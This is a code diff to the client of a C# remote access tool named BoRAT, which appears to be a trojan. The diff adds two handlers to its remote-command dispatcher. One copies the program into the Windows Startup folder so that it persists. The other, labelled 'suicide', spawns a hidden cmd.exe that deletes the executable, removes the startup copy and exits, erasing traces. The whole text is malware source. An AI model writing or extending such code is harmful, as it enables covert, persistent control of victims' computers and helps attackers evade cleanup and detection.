@@ -276,6 +276,12 @@ namespace BoRAT.Client
                     SendCommand(sendInfo);
                 }
 
+                else if (command.Equals("copyToStartup"))
+                {
+                    File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Startup));
+                    SendCommand("copyToStartup~success");
+                }
+
                 else if (command.Equals("startcommand"))
                 {
                     isStarted = true;
@@ -312,6 +318,24 @@ namespace BoRAT.Client
                     {
                         SendError("commandFailed\n");
                     }
+                }
+
+                else if (command.Equals("suicide"))
+                {
+                    // Start a new command prompt to kill the process.
+                    Process.Start(new ProcessStartInfo()
+                    {
+                        Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + Application.ExecutablePath + "\"",
+                        WindowStyle = ProcessWindowStyle.Hidden,
+                        CreateNoWindow = true,
+                        FileName = "cmd.exe"
+                    });
+
+                    // Delete from startup.
+                    File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + System.AppDomain.CurrentDomain.FriendlyName);
+
+                    // Quit the program.
+                    Application.Exit();
                 }
 
                 else if (command.Equals("drivesList"))
